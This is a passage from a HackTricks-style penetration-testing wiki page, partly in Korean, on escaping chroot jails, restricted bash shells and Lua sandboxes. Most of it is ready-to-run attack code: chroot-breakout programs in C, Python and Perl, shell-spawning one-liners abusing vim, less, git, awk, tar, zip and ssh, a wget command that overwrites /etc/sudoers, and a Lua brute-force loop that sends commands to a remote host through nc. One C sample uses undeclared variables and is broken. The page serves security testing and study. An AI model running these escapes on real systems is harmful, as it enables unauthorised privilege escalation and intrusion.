# Jail에서 탈출하기

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

실행할 수 있는 binary 중 **"Shell"** 속성이 있는 것이 있는지 [**https://gtfobins.github.io/**](https://gtfobins.github.io) **에서 검색**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에서: chroot 메커니즘은 **권한이 있는** (**root**) **사용자**에 의한 의도적인 변조를 **방어하도록 설계되지 않았다**. 대부분의 시스템에서 chroot context는 제대로 중첩되지 않으며, 충분한 권한을 가진 chroot된 program은 **두 번째 chroot를 수행해 탈출할 수 있다**.\
보통 이것은 탈출하려면 chroot 내부에서 root여야 한다는 뜻이다.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t)은 다음 시나리오를 악용해 `chroot`에서 탈출하도록 만들어졌다.

### Root + CWD

> [!WARNING]
> chroot 안에서 **root**라면 **다른 chroot를 생성**해서 **탈출할 수 있다**. 이는 (Linux에서) chroot 2개가 공존할 수 없기 때문이다. 따라서 폴더를 만든 다음 그 새 폴더에 **새 chroot를 생성**하고, 그 안에 있지 않은 상태로 만들면, 이제 **새 chroot 밖**에 있게 되므로 FS 안에 있게 된다.
>
> 이는 보통 chroot가 작업 디렉터리를 지정된 위치로 옮기지 않기 때문에 발생한다. 그래서 chroot를 만들 수 있지만 그 밖에 있을 수 있다.

보통 chroot jail 안에서는 `chroot` binary를 찾을 수 없지만, binary를 **컴파일해 업로드하고 실행**할 수는 있다:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 이는 이전 경우와 유사하지만, 이 경우 **attacker**가 **현재 디렉토리의 file descriptor를 저장**한 다음 **새 폴더에 chroot를 생성**합니다. 마지막으로, **chroot 밖의** 그 **FD**에 **access**할 수 있으므로, 그것에 **access**하고 **escape**합니다.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Get info about the jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH 수정

PATH env variable을 수정할 수 있는지 확인하세요
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim 사용하기
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

많은 제한된 환경에서는 여전히 **pagers** 또는 **help viewers**를 사용할 수 있게 해둡니다. 이런 것들은 보통 `PATH`를 다시 구성하려고 하는 것보다 더 빠르게 악용할 수 있습니다.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git`가 사용 가능하다면, 그 도움말 출력은 보통 pager를 거친다는 점을 기억하세요:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

어떤 binaries에 접근 가능한지 알게 되면, 먼저 명백한 shell spawner들을 테스트하세요:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
If you can only **inject arguments** into an allowed command (instead of running it freely), also check **GTFOArgs**.

### 스크립트 생성

_/bin/bash_를 내용으로 하는 실행 가능한 파일을 만들 수 있는지 확인하세요
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH에서 bash 얻기

ssh를 통해 접근 중이라면, 서버에 제한된 로그인 shell 대신 **다른 프로그램**을 실행하도록 요청할 수 있는 경우가 많습니다:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh`가 로컬에서 허용된 몇 안 되는 바이너리 중 하나라면, 이것이 **GTFOBin**으로도 악용될 수 있다는 점을 기억하라:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 선언
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

예를 들어 sudoers 파일을 덮어쓸 수 있습니다
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Some environments do not drop you into plain `rbash`, but into **wrappers** such as `git-shell`, `rssh`, or `lshell`:

- `git-shell` only accepts server-side Git commands plus anything present inside `~/git-shell-commands/`. If that directory exists, run `help` to enumerate the allowed custom actions. If you can **write** there, any executable dropped in that directory becomes reachable.
- `rssh` / `lshell` commonly allow only `scp`, `sftp`, `rsync`, or Git-style operations. In those cases focus on **file write primitives** first: upload `authorized_keys`, a shell startup file, or a helper script into a writable location and then reconnect with `ssh -t ...`.
- If the wrapper only filters the command line, enumerate the reachable binaries and then pivot back to **GTFOBins / GTFOArgs**.

### Other tricks

Also check:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
라이브러리의 함수를 **dots**를 사용하지 않고 호출하는 몇 가지 트릭:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
라이브러리의 함수를 열거합니다:
```bash
for k,v in pairs(string) do print(k,v) end
```
참고로 이전 one liner를 **다른 lua environment**에서 실행할 때마다 함수의 순서가 달라집니다. 따라서 특정 함수 하나를 실행해야 한다면, 서로 다른 lua environments를 로드하고 le library의 첫 번째 함수를 호출하는 brute force attack을 수행할 수 있습니다:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**인터랙티브 lua shell 얻기**: 제한된 lua shell 안에 있다면 다음을 호출해 새로운 lua shell(그리고 아마도 제한 없음)을 얻을 수 있습니다:
```bash
debug.debug()
```
## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
